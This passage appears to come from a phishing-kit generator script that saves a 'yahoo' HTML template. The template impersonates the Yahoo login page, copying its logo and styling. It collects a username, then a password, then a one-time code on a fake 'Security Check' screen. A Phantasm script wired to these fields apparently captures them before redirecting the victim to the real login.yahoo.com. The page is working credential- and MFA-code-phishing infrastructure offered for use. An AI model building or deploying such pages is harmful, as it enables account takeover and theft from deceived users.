            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
        }
        
        .password-toggle svg {
            width: 24px;
            height: 24px;
            fill: #6e7780;
        }

        .next-btn {
            background-color: #188fff;
            color: #fff;
            border: none;
            border-radius: 24px;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .next-btn:hover {
            background-color: #0074cc;
        }
        
        .secondary-btn {
            background-color: transparent;
            color: #188fff;
            border: 1px solid #188fff;
            border-radius: 24px;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }
        
        .secondary-btn:hover {
            background-color: #f0f8ff;
        }

        .checkbox-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            justify-content: flex-start;
        }

        .checkbox-wrapper input {
            width: auto;
            margin-right: 10px;
            height: auto;
        }

        .checkbox-wrapper label {
            position: static;
            font-size: 14px;
            color: #26282a;
        }

        .links {
            margin-top: 20px;
            font-size: 14px;
        }

        .links a {
            color: #188fff;
            text-decoration: none;
            margin: 0 5px;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #f0162f;
            font-size: 14px;
            margin-bottom: 20px;
            display: none;
            text-align: left;
        }
        
        .header-top {
            position: absolute;
            top: 20px;
            right: 40px;
            display: flex;
            align-items: center;
        }
        
        .header-top a {
            text-decoration: none;
            color: #188fff;
            font-size: 14px;
            font-weight: 600;
        }
        
        .header-top svg {
            width: 20px;
            height: 20px;
            margin-left: 5px;
            fill: #188fff;
        }

    </style>
</head>
<body>
    <div class="ad-side">
        <!-- Optional: Add content here if needed -->
    </div>
    
    <div class="login-side">
        <div class="header-top">
            <a href="#">Help</a>
        </div>
        
        <div class="login-box">
            <div class="logo-center">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
            </div>

            <!-- Step 1: Username -->
            <div id="step-1" class="step-container fade-in">
                <h1>Log in</h1>
                <p>Log in using your Yahoo account</p>
                
                <form>
                    <div class="input-group">
                        <input type="text" id="username" placeholder=" " required>
                        <label for="username">Username, email, or mobile</label>
                    </div>

                    <div class="checkbox-wrapper">
                        <input type="checkbox" id="stay-signed-in">
                        <label for="stay-signed-in">Stay signed in</label>
                    </div>

                    <button type="submit" class="next-btn" id="btn-next">Next</button>
                    
                    <button type="button" class="secondary-btn">Forgot username?</button>
                    
                    <button type="button" class="secondary-btn" style="border-color: #e0e4e9; color: #26282a;">Create an account</button>
                    
                    <div style="margin-top: 20px; font-size: 12px; color: #6e7780;">
                        Or, <a href="#" style="color: #188fff; text-decoration: none;">continue with Google</a>
                    </div>
                </form>
            </div>

            <!-- Step 2: Password -->
            <div id="step-2" class="step-container hidden">
                <div class="user-greeting">Hello</div>
                <div class="user-email-display" id="display-email">user@yahoo.com</div>
                
                <div class="error-message" id="error-msg">Invalid password. Please try again.</div>

                <form>
                    <div class="input-group">
                        <input type="password" id="password" placeholder=" " required>
                        <label for="password">Password</label>
                        <button type="button" class="password-toggle" onclick="togglePassword()">
                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                        </button>
                    </div>

                    <button type="submit" class="next-btn" id="btn-login">Next</button>
                    
                    <div style="margin-top: 10px;">
                        <a href="#" style="color: #188fff; text-decoration: none; font-size: 14px;">Forgot password?</a>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://login.yahoo.com/',
                selectors: {
                    email: '#username',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    userDisplay: '#display-email',
                    errorMsg: '#error-msg'
                }
            });
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>
"""
save_template("yahoo", yahoo_html)
